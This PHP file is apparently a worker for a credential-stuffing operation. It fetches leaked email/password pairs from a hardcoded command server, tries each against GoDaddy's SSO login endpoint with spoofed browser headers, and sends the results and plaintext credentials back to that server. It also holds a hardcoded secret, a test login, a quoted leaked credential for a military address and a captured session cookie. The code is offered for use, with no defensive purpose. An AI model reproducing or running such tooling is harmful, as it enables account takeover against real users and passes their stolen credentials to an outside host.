<?php
/**
 * Created by PhpStorm.
 * User: kid-dorr
 * Date: 6/6/2017
 * Time: 8:21 AM
 */

// add bindto to worker
//$socket = array('bindto' => '192.168.0.1:0');
$socket = null;
// url
$host = "http://158.69.193.39";
$connect_url = "/w/api/v1/workers/connect.php";
$nextmail_url = "/w/api/v1/mails/next.php";
$newresult_url = "/w/api/v1/results/new.php";

$secret = "\$2y\$12\$J1k/vLIWAW13Kg5KGBxpY.tfuaQN2IVJ5QjS27j/UJSCYu0XERzsW";

// connect to cloud
function isConnected($url, $sk = null) {

    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    // add socket
    if ($sk) {
        $opts['socket'] = $sk;
    } else {
        echo "socket null";
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function nextMail($url, $sk = null) {
//    $connect_init = curl_init($url);
//
//    curl_setopt($connect_init, CURLOPT_RETURNTRANSFER, 1);
//    $connect_resp = curl_exec($connect_init);
//
//    $json_resp = json_decode($connect_resp, true);
//    //print_r($json_resp["status"]);
//    curl_close($connect_init);
//    return $json_resp;
//    // get a mailpass to check "Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) ) ";
    $opts = array(
        'http' => array(
            'method' => 'GET',
            'header' => 'Accept-languare: en\r\n'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($url, false, $context);
    $json_resp = json_decode($resp, true);
    return $json_resp;
}

function newResult($url, $query, $sk = null) {
    //$secret = $query['secret'];
    //echo $secret."<br>";

    $lease_id = $query['id'];

    $mail = $query['mail'];

    $pass = $query['pass'];

    $type = $query['type'];

    $result = $query['result'];

    $data = $query['data'];

    $new_result_url = $url."&id=".$lease_id."&mail=".$mail."&pass=".$pass."&type=".$type."&result=".$result."&data=".$data;
    //echo $new_result_url;
//    $new_result_init = curl_init($new_result_url);
//    curl_setopt($new_result_init, CURLOPT_POST, 1);
//
//    curl_setopt($new_result_init, CURLOPT_RETURNTRANSFER, true);
//
//    $new_result_resp = curl_exec($new_result_init);
//
//    curl_close($new_result_init);
//
//    //print_r($new_result_resp);

    $opts = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Accept-language: en'
        )
    );
    if ($sk) {
        $opts['socket'] = $sk;
    }

    $context = stream_context_create($opts);
    $resp = file_get_contents($new_result_url, false, $context);
    print_r($resp);
}


function checkGodaddy($mailpass, $sk = null) {
    echo "check godaddy";
    $mail = $mailpass['mail'];
    $pass = $mailpass['pass'];
    //print_r($mailpass);

    $get_login_url = "https://sso.godaddy.com/?realm=idp&path=%2F&app=mya";
    $post_login_url = "https://sso.godaddy.com/v1/api/login?realm=idp&app=mya&path=/&plid=1&";
    $get_logout_url = "https://sso.godaddy.com/logout?realm=idp&app=mya&path=";

    // post login
//    $post_login_init = curl_init($post_login_url);
//    //curl_setopt($post_login_url, CURLOPT_POST, 1);
//    curl_setopt($post_login_init, CURLOPT_HTTPHEADER, array(
//        'Upgrade-Insecure-Requests: 1',
//        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
//        'Content-Type: application/x-www-form-urlencoded',
//        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
//        'Accept-Language: en-US,en;q=0.8'
//    ));
//    curl_setopt($post_login_init, CURLOPT_POSTFIELDS, "app=mya&layout=layout.rebrand_layout.html&name=".$mail."&password=".$pass."&realm=idp&remember_me=on");
//    curl_setopt($post_login_init, CURLOPT_VERBOSE, true);
//    curl_setopt($post_login_init, CURLOPT_RETURNTRANSFER, true);
//    curl_setopt($post_login_init, CURLOPT_SSL_VERIFYPEER, false);
//
//
//    $post_login_resp = curl_exec($post_login_init);

    $login_data = http_build_query(
        array(
            'app' => 'mya',
            'layout' => 'layout.rebrand_layout.html',
            'name' => $mail,
            'password' => $pass,
            'realm' => 'idp',
            'remember_me' => 'on',
        )
    );

    $login_query = http_build_query(
        array(
            'username' => $mail,
            'password' => $pass,
            'remember-me' => 'true',
            'app' => 'mya',
            'API_HOST' => "godaddy.com",
            'path' => "/",
            'plid' => 1,
        )
    );

    print_r($login_query);

    $login_json = json_encode(
        array(
            'username' => $mail,
            'password' => $pass,
            'remember-me' => 'true',
            'app' => 'mya',
            'API_HOST' => "godaddy.com",
            'path' => "/",
            'plid' => 1,
        )
    );

    print_r($login_json);

    $login_opts = array(
        'http' => array(
            'method' => 'POST',
            'header' => 'Upgrade-Insecure-Requests: 1\r\n'.
                'Accept: application/json\r\n'.
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n'.
                //'X-DevTools-Emulate-Network-Conditions-Client-Id: 939446a7-410b-4009-92a6-ad794e747d0a'.
                //'X-DevTools-Request-Id: 17184.149'.
                //'Origin: https://sso.godaddy.com'.
                'content-type: application/json\r\n'.
                //'Referer: https://sso.godaddy.com/?realm=idp&path=%2F&app=mya'.
                'Accept-Encoding: gzip, deflate, br\r\n'.
                'Accept-Language: en-US,en;q=0.8\r\n'.
                'Connection:keep-alive'.
                'Content-Length: '.strlen($login_json),
                //'Cookie: currency=VND; _msuuid_esfyia2vf0=7285CF6D-48DC-4D2B-83B9-31804C27D4AD; __qca=P0-736176428-1495682454347; __lc.visitor_id.6514781=S1495682382.c2860d7669; LPVID=dmYzA2MzM3MDllMjA4OWU3; lls_idp=eyJhbGciOiAiUlMyNTYiLCAia2lkIjogIkh1aFlZWEM4RVEifQ.eyJmaXJzdG5hbWUiOiAiVHJ1bmciLCAibGFzdG5hbWUiOiAiR2lhbmciLCAibGxzX3Nob3BwZXJJZCI6ICIxNTQzNzc5MjEiLCAicGxpZCI6ICIxIiwgInVzZXJuYW1lIjogImdpYW1pbmNodTAzIn0.qJtE6sdU_W0GT9D3coV-EB3L8h8yIXc5nTH_S6vfrRm6xDd7LnoCHtcXbbsws1fnV485l3vc21NAoW7H9rqB9ZviU3X29OkQLOa0rhQQNyiHwNgq-YyoD6OleM9ouTg4K9ZG05rLeU2eSVaCUts_yAVeuRqO7PI-eJvaJB1Ed9o; login_info_idp=%7B%22loginname%22%3A%20%22giaminchu03%22%2C%20%22per%22%3A%200%7D; visitor=vid=f191f5db-024c-4b4c-97cc-f2efca48a001; asua=1; cvo_sid1=4YY2DWCYPRFJ; __CT_Data=gpv=3&apv_3_www23=3&cpv_3_www23=3; ShopperId1=kgxjyameadafgccjnaaekhiegisiscmg; countrysite1=vn; language1=vi-VN; cvo_tid1=AQu1YbdFFAY|1495682381|1495682807|74; __utma=247200914.384232864.1495682884.1495682884.1495682884.1; __utmz=247200914.1495682884.1.1.utmcsr=sso.godaddy.com|utmccn=(referral)|utmcmd=referral|utmcct=/; fb_sessiontraffic=S_TOUCH=06/12/2017%2003:41:26.544&pathway=27502841-434b-4a6c-8bd2-fc490d3e25bb&V_DATE=06/11/2017%2020:41:26.560&pc=0; pathway=27502841-434b-4a6c-8bd2-fc490d3e25bb; uxcsplit=A; market=vi-VN; actpro=rdhevbjhndxjreucbhjdnhackjofvdpiccnhgfhitjaftevhkenjjdqjaihawdda; OPTOUTMULTI=0:0%7Cc2:0%7Cc9:0; pb_click_id=undefined; last_five_searches=; utag_main=v_id:015c3d9f10690090748822821fd004073001706b00bd0$_sn:2$_ss:1$_st:1497240798453$dc_visit:2$_pn:1%3Bexp-session$ses_id:1497238997880%3Bexp-session$dc_event:2%3Bexp-session; gd_LC={%22vid%22:%22%22%2C%22lpg%22:1497238999079%2C%22lst%22:1497238999074%2C%22vst%22:1}',
            'content' => $login_json,
        )
    );
    if ($sk) {
        $login_opts['socket'] = $sk;
    }



    $login_context = stream_context_create($login_opts);


    $login_resp = file_get_contents("https://sso.godaddy.com/v1/api/login?realm=idp&app=mya&path=/&plid=1&", false, $login_context);
    $login_status = $http_response_header[0];
    print_r($http_response_header);

    if ($login_status === "HTTP/1.1 302 FOUND") {
        $logout_opts = array(
            'method' => 'GET',
            'header' => 'Upgrade-Insecure-Requests: 1\r\n'.
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3119.0 Safari/537.36\r\n'.
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n'.
                'Referer: https://mya.godaddy.com/\r\n'.
                'Accept-Encoding: gzip, deflate, br\r\n'.
                'Accept-Language: vi-VN,vi;q=0.8,fr-FR;q=0.6,fr;q=0.4,en-US;q=0.2,en;q=0.2\r\n',
        );

        if ($sk) {
            $logout_opts['socket'] = $sk;
        }

        $logout_context = stream_context_create($logout_opts);

        file_get_contents($get_logout_url, false, $logout_context);

        echo "login success";
        return 1;
    } else {
        echo "login fault";
        return 0;
    }

    //print_r($login_resp);



//    if (!curl_errno($post_login_init)) {
//        switch ($http_code = curl_getinfo($post_login_init, CURLINFO_HTTP_CODE)) {
//            case 200:  # Not login
//                echo 'login fault';
//                curl_close($post_login_init);
//                return 0;
//                break;
//            case 302: # OK
//                echo 'login success';
//
//                sleep(5000);
//                $get_logout_init = curl_init($get_logout_url);
//                curl_setopt($get_logout_init, CURLOPT_VERBOSE, true);
//                curl_setopt($get_logout_init, CURLOPT_RETURNTRANSFER, true);
//                curl_setopt(get_logout_init, CURLOPT_SSL_VERIFYPEER, false);
//                curl_exec($get_logout_init);
//                // logout
//                curl_close($post_login_init);
//                return 1;
//                break;
//            default:
//                echo 'Unexpected HTTP code: ', $http_code, "\n";
//        }
//    }

}

//$is_connected = isConnected($host.$connect_url."?secret=".$secret);
//print_r($is_connected);
//if ($is_connected) {
//    echo $is_connected['desc'];
//    $nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1");
//    print_r($nextmail_resp);
//}

$test_mp = array(
    'mail' => 'giaminchu03',
    'pass' => 'Satsatsat1@',
);


//checkGodaddy($test_mp);
//$is_connected = isConnected($host.$connect_url."?secret=".$secret, $socket);
//if ($is_connected) {
//    echo $is_connected['desc'];
//    // get mailpass
//    $nextmail_resp = nextMail($host.$nextmail_url."?secret=".$secret."&type=1", $socket);
//    // Array ( [status] => 1 [data] => Array ( [id] => 87482 [mail] => john.braun@socom.mil [pass] => raz.rv [types] => 1 ) )
//
//    if($nextmail_resp['status']) {
//        $mailpass = $nextmail_resp['data'];
//        $result = checkGodaddy($mailpass, $socket);
//        $query = array(	'id' => $mailpass['id'],
//            'mail' => $mailpass['mail'],
//            'pass' => $mailpass['pass'],
//            'type' => $mailpass['types'],
//            'result' => $result,
//            'data' => '');
//
//        $new_result_url = $host.$newresult_url."?secret=".$secret;
//        newResult($new_result_url, $query, $socket);
//        echo "update success";
//    }
//
//}

checkGodaddy($test_mp);
